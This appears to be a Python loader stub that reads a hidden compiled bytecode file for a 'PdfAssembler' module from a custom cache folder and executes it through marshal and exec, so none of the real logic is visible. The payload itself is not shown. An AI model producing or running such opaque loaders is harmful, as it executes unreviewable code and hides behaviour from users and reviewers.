
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfAssembler_bb9aa5d8fe944ee0835b77a8a85b3cf7.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
